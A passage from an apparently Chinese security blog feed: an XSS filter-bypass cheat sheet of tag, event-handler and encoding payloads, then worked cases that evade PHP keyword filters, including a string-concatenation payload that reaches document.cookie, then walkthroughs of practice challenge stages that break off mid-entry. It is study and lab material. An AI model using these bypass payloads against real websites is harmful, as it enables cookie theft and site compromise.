class="name">STYLE</span> <span class="attr">TYPE</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined">alert('XSS');</span><span class="tag">&lt;/<span class="name">STYLE</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">STYLE</span> <span class="attr">type</span>=<span class="string">"text/css"</span>&gt;</span><span class="css"><span class="selector-tag">BODY</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">"javascript:alert('XSS')"</span>)&#125;</span><span class="tag">&lt;/<span class="name">STYLE</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="css">@<span class="keyword">keyframes</span> x&#123;<span class="selector-tag">from</span> &#123;<span class="attribute">left</span>:<span class="number">0</span>;&#125;<span class="selector-tag">to</span> &#123;<span class="attribute">left</span>: <span class="number">1000px</span>;&#125;&#125;<span class="selector-pseudo">:target</span> &#123;<span class="attribute">animation</span>:<span class="number">10s</span> ease-in-out <span class="number">0s</span> <span class="number">1</span> x;&#125;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">x</span> <span class="attr">style</span>=<span class="string">"position:absolute;"</span> <span class="attr">onanimationcancel</span>=<span class="string">"alert(1)"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span> //CSS动画取消时触发(Firefox)</span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="css">@<span class="keyword">keyframes</span> x&#123;<span class="selector-tag">from</span> &#123;<span class="attribute">left</span>:<span class="number">0</span>;&#125;<span class="selector-tag">to</span> &#123;<span class="attribute">left</span>: <span class="number">1000px</span>;&#125;&#125;<span class="selector-pseudo">:target</span> &#123;<span class="attribute">animation</span>:<span class="number">10s</span> ease-in-out <span class="number">0s</span> <span class="number">1</span> x;&#125;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">x</span> <span class="attr">style</span>=<span class="string">"position:absolute;"</span> <span class="attr">onanimationcancel</span>=<span class="string">"alert(1)"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span> // CSS动画结束时触发（Chrome、Firefox、IE、Safari)</span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="css"><span class="selector-pseudo">:target</span> &#123;<span class="attribute">color</span>: red;&#125;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">x</span> <span class="attr">style</span>=<span class="string">"transition:color 10s"</span> <span class="attr">ontransitioncancel</span>=<span class="string">alert(1)</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span> // CSS过渡取消时触发（Firefox)</span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="css"><span class="selector-pseudo">:target</span> &#123;<span class="attribute">color</span>:red;&#125;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">x</span> <span class="attr">style</span>=<span class="string">"transition:color 1s"</span> <span class="attr">ontransitionend</span>=<span class="string">alert(1)</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span> // CSS过渡结束时触发（Chrome)</span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="css"><span class="selector-pseudo">:target</span> &#123;<span class="attribute">transform</span>: <span class="built_in">rotate</span>(180deg);&#125;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">x</span> <span class="attr">style</span>=<span class="string">"transition:transform 2s"</span> <span class="attr">ontransitionrun</span>=<span class="string">alert(1)</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span> // CSS过渡开始时触发（Firefox)</span><br></pre></td></tr></table></figure><h4 id="◈-lt-svg-gt-标签"><a href="#◈-lt-svg-gt-标签" class="headerlink" title="◈ &lt;svg&gt; 标签"></a>◈ <code>&lt;svg&gt;</code> 标签</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span>/<span class="attr">onload</span>=<span class="string">prompt(1);</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onclick</span>/<span class="attr">onmouseover</span>/<span class="attr">onmouseup</span>=<span class="string">alert(1)</span>&gt;</span><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert&amp;#40/1/&amp;#41</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> <span class="tag">&lt;/<span class="name">svg</span>&gt;</span>// Works With All Browsers</span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">animate</span> <span class="attr">onbegin</span>=<span class="string">alert(1)</span> <span class="attr">attributeName</span>=<span class="string">x</span> <span class="attr">dur</span>=<span class="string">1s</span>&gt;</span> // 网址更改后触发（Chrome）</span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">animate</span> <span class="attr">onbegin</span>=<span class="string">alert(1)</span> <span class="attr">attributeName</span>=<span class="string">x</span> <span class="attr">dur</span>=<span class="string">1s</span>&gt;</span> // svg动画开始时触发（Chrome、Firefox、Safari）</span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span> // 加载元素时触发（Safari)</span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">animate</span> <span class="attr">onrepeat</span>=<span class="string">alert(1)</span> <span class="attr">attributeName</span>=<span class="string">x</span> <span class="attr">dur</span>=<span class="string">1s</span> <span class="attr">repeatCount</span>=<span class="string">2</span> /&gt;</span> // svg动画重复时触发（Chrome、Firefox、Safari)</span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">xlink:href</span>=<span class="string">"javascript:alert(1)"</span>&gt;</span><span class="tag">&lt;<span class="name">text</span> <span class="attr">x</span>=<span class="string">"20"</span> <span class="attr">y</span>=<span class="string">"20"</span>&gt;</span>XSS<span class="tag">&lt;/<span class="name">text</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span> // 带有JavaScript协议的SVG中的Xlink命名空间</span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">animate</span> <span class="attr">xlink:href</span>=<span class="string">#xss</span> <span class="attr">attributeName</span>=<span class="string">href</span> <span class="attr">values</span>=<span class="string">javascript:alert(1)</span> /&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">xss</span>&gt;</span><span class="tag">&lt;<span class="name">text</span> <span class="attr">x</span>=<span class="string">20</span> <span class="attr">y</span>=<span class="string">20</span>&gt;</span>XSS<span class="tag">&lt;/<span class="name">text</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span> // 使用值的SVG动画标签</span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">animate</span> <span class="attr">xlink:href</span>=<span class="string">#xss</span> <span class="attr">attributeName</span>=<span class="string">href</span> <span class="attr">from</span>=<span class="string">javascript:alert(1)</span> <span class="attr">to</span>=<span class="string">1</span> /&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">xss</span>&gt;</span><span class="tag">&lt;<span class="name">text</span> <span class="attr">x</span>=<span class="string">20</span> <span class="attr">y</span>=<span class="string">20</span>&gt;</span>XSS<span class="tag">&lt;/<span class="name">text</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span> // SVG动画标签用于</span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">set</span> <span class="attr">xlink:href</span>=<span class="string">#xss</span> <span class="attr">attributeName</span>=<span class="string">href</span> <span class="attr">from</span>=<span class="string">?</span> <span class="attr">to</span>=<span class="string">javascript:alert(1)</span> /&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">xss</span>&gt;</span><span class="tag">&lt;<span class="name">text</span> <span class="attr">x</span>=<span class="string">20</span> <span class="attr">y</span>=<span class="string">20</span>&gt;</span>XSS<span class="tag">&lt;/<span class="name">text</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span>  // SVG设置标签</span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">script</span> <span class="attr">href</span>=<span class="string">"data:text/javascript,alert(1)"</span> /&gt;</span><span class="actionscript"> <span class="comment">// SVG脚本href属性，（IE、Firefox）无需关闭脚本标签,（Google）需要关闭</span></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">+++++++++++++++++带有HTML编码的SVG脚本+++++++++++++++++</span></span><br><span class="line"><span class="handlebars"><span class="xml"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">&amp;#97;lert(1)</span></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">&amp;#x61;lert(1)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert&amp;NewLine;(1)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">x=<span class="string">"&amp;quot;,alert(1)//"</span>;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="◈-lt-var-gt-标签"><a href="#◈-lt-var-gt-标签" class="headerlink" title="◈ &lt;var&gt; 标签"></a>◈ <code>&lt;var&gt;</code> 标签</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">var</span> <span class="attr">onmouseover</span>=<span class="string">"prompt(1)"</span>&gt;</span>M<span class="tag">&lt;/<span class="name">var</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="◈-lt-video-gt-标签"><a href="#◈-lt-video-gt-标签" class="headerlink" title="◈ &lt;video&gt; 标签"></a>◈ <code>&lt;video&gt;</code> 标签</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">prompt(1);</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">video</span>&gt;</span><span class="tag">&lt;<span class="name">source</span> <span class="attr">onerror</span>=<span class="string">"javascript:alert(1)"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">oncanplaythrough</span>=<span class="string">alert(1)</span>&gt;</span><span class="tag">&lt;<span class="name">source</span> <span class="attr">src</span>=<span class="string">"validvideo.mp4"</span> <span class="attr">type</span>=<span class="string">"video/mp4"</span>&gt;</span><span class="tag">&lt;/<span class="name">video</span>&gt;</span> // 加载足够的数据以完全播放资源时触发（Chrome、Firefox、IE、Safari)</span><br><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">controls</span> <span class="attr">onended</span>=<span class="string">alert(1)</span>&gt;</span><span class="tag">&lt;<span class="name">source</span> <span class="attr">src</span>=<span class="string">"mov_bbb.mp4"</span> <span class="attr">type</span>=<span class="string">"video/mp4"</span>&gt;</span><span class="tag">&lt;/<span class="name">video</span>&gt;</span> // 视频播放完后触发</span><br></pre></td></tr></table></figure><h3 id="三、xss-案例"><a href="#三、xss-案例" class="headerlink" title="三、xss 案例"></a>三、xss 案例</h3><h4 id="案例一：用-location-变形-payload"><a href="#案例一：用-location-变形-payload" class="headerlink" title="案例一：用 location 变形 payload"></a><code>案例一</code>：用 location 变形 payload</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">'X-XSS-Protection: 0'</span>);</span><br><span class="line">$xss = <span class="keyword">isset</span>($_GET[<span class="string">'xss'</span>])?$_GET[<span class="string">'xss'</span>]:<span class="string">''</span>;</span><br><span class="line">$xss = str_replace(<span class="keyword">array</span>(<span class="string">"("</span>,<span class="string">")"</span>,<span class="string">"&amp;"</span>,<span class="string">"\\"</span>,<span class="string">"&lt;"</span>,<span class="string">"&gt;"</span>,<span class="string">"'"</span>,<span class="string">"`"</span>,<span class="string">"&amp;"</span>), <span class="string">''</span>, $xss);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;img src=\"&#123;$xss&#125;\"&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>该案例的过滤器过滤了array(“(“,”)”,”&amp;”,”\”,”&lt;”,”&gt;”,”‘“,”`“,”&amp;”)，而没有过滤双引号，输出点在 <code>&lt;img src=&quot;xxxx&quot;&gt;</code>，xxxx这里，怎么构造一个可以利用的XSS Payload？</p></blockquote><p><code>涉及的知识点</code></p><blockquote><p>涉及到js中关键词(函数名、变量名、保留字等)、字符串、左值与右值的问题，也是所有语言中都有的问题。</p></blockquote><p><code>举例</code></p><blockquote><p>比如<code>test=&quot;phithon&quot;;</code>，这里test就是左值、变量名，”phithon”就是右值、字符串，<code>=</code>和<code>&quot;</code>是符号。字符串中可以用编码来替换原始字符，比如用<code>\u0028</code>代替左括号<code>(</code>，或用<code>\50</code>来代替左括号<code>(</code>。左值必须是可写的，比如一个变量，我们不能把字符串放在等号左边，因为字符串是一个只读的值。还有，有关于javascript的字符编码，都只能用在字符串中，不能用字符编码去代替符号或变量名、函数名。</p></blockquote><p><code>分析</code></p><blockquote><p>可以利用location加javascript伪协议，将“符号”、“变量名”、“函数名”统统变成“字符串”，在字符串中我们可以使用所有js里可以使用的编码，去构造payload。怎么变？比如我们可以构造如下payload：</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"1"</span> <span class="attr">onerror</span>=<span class="string">location</span>=<span class="string">"javascript:alert(1)"</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>这个时候，alert(1)被放进了字符串里，因为有javascript伪协议，所以也可以执行xss。在字符串中就能够用很多编码了，虽然我们这里过滤了<code>(</code>，但可以用url编码来替代括号，如下payload：</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"1"</span> <span class="attr">onerror</span>=<span class="string">location</span>=<span class="string">"javascript:alert%281%29"</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>就能成功绕过上述filter。我们把难度提高一点。再拦截一些关键词，比如document，cookie，eval，setTimeout，alert等：</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">'X-XSS-Protection: 0'</span>);</span><br><span class="line">$xss = <span class="keyword">isset</span>($_GET[<span class="string">'xss'</span>])?$_GET[<span class="string">'xss'</span>]:<span class="string">''</span>;</span><br><span class="line">$xss = str_replace(<span class="keyword">array</span>(<span class="string">"("</span>,<span class="string">")"</span>,<span class="string">"&amp;"</span>,<span class="string">"\\"</span>,<span class="string">"&lt;"</span>,<span class="string">"&gt;"</span>,<span class="string">"'"</span>), <span class="string">''</span>, $xss);</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">'/(script|document|cookie|eval|setTimeout|alert)/'</span>, $xss)) &#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">'bad'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;img src=\"&#123;$xss&#125;\"&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>这时我们怎么能弹出cookie？这个时候我们可以用字符串拼接的方式绕过，这也是得益于我们之前将要执行的“函数”变成了“字符串”才有的效果，我们不可能直接``，js中只有“字符串”才能拼接。payload例如：</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"1"</span> <span class="attr">onerror</span>=<span class="string">location</span>=<span class="string">"javascr"</span>+"<span class="attr">ipt:al</span>"+"<span class="attr">ert</span>%<span class="attr">28docu</span>"+"<span class="attr">ment.co</span>"+"<span class="attr">okie</span>%<span class="attr">29</span>"&gt;</span></span><br></pre></td></tr></table></figure><h3 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h3><p>1.<a href="https://momomoxiaoxi.com/2017/10/10/XSS/" target="_blank" rel="noopener">XSS测试备忘录</a></p><h3 id="更新日志"><a href="#更新日志" class="headerlink" title="更新日志"></a><code>更新日志</code></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">2020.3.9 原发</span><br><span class="line">2020.3.12增加一些各标签中的payload，来源：https://mp.weixin.qq.com/s/pewStdGNzvv5OTl8Vh7okQ</span><br><span class="line">2020.3.14增加&amp;NewLine;&amp;Tab;&amp;colon;增加一些标签的payload</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;一、绕过-XSS-Filter-的方法&quot;&gt;&lt;a href=&quot;#一、绕过-XSS-Filter-的方法&quot; class=&quot;headerlink&quot; title=&quot;一、绕过 XSS Filter 的方法&quot;&gt;&lt;/a&gt;一、绕过 XSS Filter 的方法&lt;/h3&gt;&lt;h4 i
      
    
    </summary>
    
    
      <category term="web" scheme="https://muzibing.github.io/tags/web/"/>
    
      <category term="xss" scheme="https://muzibing.github.io/tags/xss/"/>
    
  </entry>
  
  <entry>
    <title>Th1s_i3_XSS_challenges&amp;from:stage#5&amp;to:stage#12</title>
    <link href="https://muzibing.github.io/2020/03/08/2020.03.08%EF%BC%8899%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/03/08/2020.03.08（99）/</id>
    <published>2020-03-07T16:00:00.000Z</published>
    <updated>2020-03-09T11:24:32.267Z</updated>
    
    <content type="html"><![CDATA[<h3 id="font-color-navy0x05-length-limited-textfont"><a class="markdownIt-Anchor" href="#font-color-navy0x05-length-limited-textfont"></a> <font color="navy">0x05 Length limited text</font></h3><h4 id="hint"><a class="markdownIt-Anchor" href="#hint"></a> <code>Hint</code></h4><blockquote><p><font color="white">length limited text box</font></p></blockquote><h4 id="题目分析"><a class="markdownIt-Anchor" href="#题目分析"></a> <code>题目分析</code></h4><blockquote><p>① 首先在输入框中随便输入值 <code>alert(/xss/)</code>，点击<code>search</code>，打开源代码如下：</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"p1"</span> <span class="attr">maxlength</span>=<span class="string">"15"</span> <span class="attr">size</span>=<span class="string">"30"</span> <span class="attr">value</span>=<span class="string">"alert(/xss/)"</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>不难发现我们输的的字符串被赋值给了 <code>value</code> ，那么下一步进行闭合绕过：<code>&quot; onclick=alert(document.domain)</code>，但是在构造的时候却发现，输入框被允许输入最大的字符串长度为<code>15</code>，所以我们的payload无效；</p><p><br>② 虽然输入框要求只能输入 <code>15</code> 个字符串，但是我们可以利用 <code>burpsuit</code> 进行抓包改包，达到我们想要的效果：</p></blockquote><p><img src="/images/99-1.png" alt></p><blockquote><p>点击<code>Forward</code>，发送我们修改过的包，然后再点击输入框，弹窗成功：</p></blockquote><p><img src="/images/99-2.png" alt></p><h4 id="相关知识点"><a class="markdownIt-Anchor" href="#相关知识点"></a> <code>相关知识点</code></h4><blockquote><ol><li><code>burpsuit</code> 的使用</li></ol></blockquote><h4 id="payload"><a class="markdownIt-Anchor" href="#payload"></a> <code>payload</code></h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload1:" onclick/onmouseup/onmousedown = alert(document.domain)</span><br><span class="line">payload2:"&gt;<span class="tag">&lt;<span class="name">img</span>/<span class="attr">src</span>=<span class="string">#</span> <span class="attr">onerror</span>=<span class="string">alert(document.domain)/</span>&gt;</span></span><br><span class="line">payload3:"&gt;<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:alert(document.domain)"</span>&gt;</span>/xss/<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">payload4:"&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="built_in">document</span>.domain)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p><strong>注</strong>：以上payload需在 burpsuit 中进行；</p></blockquote><h4 id="题目类型"><a class="markdownIt-Anchor" href="#题目类型"></a> <code>题目类型</code></h4><blockquote><p>简单的标签闭合问题，并且利用 burpsuit 进行重放的题目</p></blockquote><h3 id="font-color-navy0x06-input-标签内部-js-事件font"><a class="markdownIt-Anchor" href="#font-color-navy0x06-input-标签内部-js-事件font"></a> <font color="navy">0x06 <code>&lt;input&gt;</code> 标签内部 JS 事件</font></h3><h4 id="hint-2"><a class="markdownIt-Anchor" href="#hint-2"></a> <code>Hint</code></h4><blockquote><p><font color="white"></font></p></blockquote><h4 id="题目分析-2"><a class="markdownIt-Anchor" href="#题目分析-2"></a> <code>题目分析</code></h4><blockquote><p>① 在输入框中试探性的输入 <code>&quot;&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;</code>，得到如下结果：</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"p1"</span> <span class="attr">size</span>=<span class="string">"50"</span> <span class="attr">value</span>=<span class="string">""</span> &amp;<span class="attr">gt</span>;&amp;<span class="attr">lt</span>;<span class="attr">script</span>&amp;<span class="attr">gt</span>;<span class="attr">alert</span>(=<span class="string">""</span> <span class="attr">xss</span>=<span class="string">""</span> )&amp;<span class="attr">lt</span>;=<span class="string">""</span> <span class="attr">script</span>&amp;<span class="attr">gt</span>;"=<span class="string">""</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>从上面的结果中可以看出，将我们输入的 <code>&lt;</code> 和<code>&gt;</code> 进行了一次实体编码，那么我们不能再利用 <code>&lt;</code> 和 <code>&gt;</code> 进行闭合绕过了，我们可以用上个题目中的 payload1 进行尝试，果然成功弹窗。</p></blockquote><h4 id="相关知识点-2"><a class="markdownIt-Anchor" href="#相关知识点-2"></a> <code>相关知识点</code></h4><blockquote><ol><li>利用 <code>on+event</code> 进行弹窗</li></ol></blockquote><h4 id="payload-2"><a class="markdownIt-Anchor" href="#payload-2"></a> <code>payload</code></h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:" onclick/onmouseup/onmousedown/on+evet = alert(document.domain)</span><br></pre></td></tr></table></figure><h4 id="题目类型-2"><a class="markdownIt-Anchor" href="#题目类型-2"></a> <code>题目类型</code></h4><blockquote><p>不用闭合标签，在标签内部添加事件，通过触发事件来执行 <code>payload</code>。</p></blockquote><h3 id="font-color-navy0x07-input-标签内部-js-事件font"><a class="markdownIt-Anchor" href="#font-color-navy0x07-input-标签内部-js-事件font"></a> <font color="navy">0x07 <code>&lt;input &gt;</code>标签内部 js 事件</font></h3><h4 id="hint-3"><a class="markdownIt-Anchor" href="#hint-3"></a> <code>Hint</code></h4><blockquote><p><font color="white">nearly the same… but a bit more tricky.</font></p></blockquote><h4 id="题目分析-3"><a class="markdownIt-Anchor" href="#题目分析-3"></a> <code>题目分析</code></h4><blockquote><p>① 和上面的题目一样，首先来浏览器如何解析我们的输入：<code>&quot; onclick=alert(document.domain)</code>，得到如下结果：</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"p1"</span> <span class="attr">size</span>=<span class="string">"50"</span> <span class="attr">value</span>=<span class="string">""</span> <span class="attr">onclick</span>=<span class="string">"alert(document.domain)"</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>② 看到源码后，我觉得构造的payload被成功执行了，于是点击输入框，果真弹窗成功。</p></blockquote><h4 id="相关知识点-3"><a class="markdownIt-Anchor" href="#相关知识点-3"></a> <code>相关知识点</code></h4><blockquote><p>和上一道题目没有太大的区别</p></blockquote><h4 id="payload-3"><a class="markdownIt-Anchor" href="#payload-3"></a> <code>payload</code></h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">" onclick=alert(document.domain)</span><br></pre></td></tr></table></figure><h4 id="题目类型-3"><a class="markdownIt-Anchor" href="#题目类型-3"></a> <code>题目类型</code></h4><blockquote><p>和上一道题目没有太大的区别</p></blockquote><h3 id="font-color-navy0x08-javascript伪协议font"><a class="markdownIt-Anchor" href="#font-color-navy0x08-javascript伪协议font"></a> <font color="navy">0x08 javascript:伪协议</font></h3><h4 id="hint-4"><a class="markdownIt-Anchor" href="#hint-4"></a> <code>Hint</code></h4><blockquote><p><font color="white">the ‘javascript’ scheme.</font></p></blockquote><h4 id="题目分析-4"><a class="markdownIt-Anchor" href="#题目分析-4"></a> <code>题目分析</code></h4><blockquote><p>① 和前面的题目一样，首先输入一些字符串，来看看浏览器怎么执行的，在这里我输入的是<code>/xss/</code>，结果如下图：</p></blockquote><p><img src="/images/99-3.png" alt></p><blockquote><p>② 在清楚浏览器是将我们的输入变为一个链接，文本和链接的内容都是我们输入的内容，这道题就不能再利用闭合绕过的原理了，这道题目需要一个新的知识点：<code>伪协议</code></p></blockquote><h4 id="相关知识点-4"><a class="markdownIt-Anchor" href="#相关知识点-4"></a> <code>相关知识点</code></h4><blockquote><ol><li>伪协议 <code>javascript:</code> 的使用</li><li>javascript 的入口</li></ol></blockquote><h4 id="payload-4"><a class="markdownIt-Anchor" href="#payload-4"></a> <code>payload</code></h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:alert(<span class="built_in">document</span>.domain)</span><br></pre></td></tr></table></figure><blockquote><p>执行成功，如下图所示：</p></blockquote><p><img src="/images/99-4.png" alt></p><h4 id="题目类型-4"><a class="markdownIt-Anchor" href="#题目类型-4"></a> <code>题目类型</code></h4><blockquote><p><code>&lt;a&gt;</code> 标签中 <code>href</code> 的构造</p></blockquote><h3 id="font-color-navy0x09-utf-7font"><a class="markdownIt-Anchor" href="#font-color-navy0x09-utf-7font"></a> <font color="navy">0x09 UTF-7</font></h3><h4 id="hint-5"><a class="markdownIt-Anchor" href="#hint-5"></a> <code>Hint</code></h4><blockquote><p><code>UTF-7 XSS</code></p></blockquote><h4 id="题目分析-5"><a class="markdownIt-Anchor" href="#题目分析-5"></a> <code>题目分析</code></h4><blockquote><p>之所以把提示给显示出来，是因为这是一道 <code>utf-7</code> 问题的题目，需要在 <code>IE7</code> 浏览器才能执行，而且现在用的都是 <code>utf-8</code>，<code>utf-7</code> 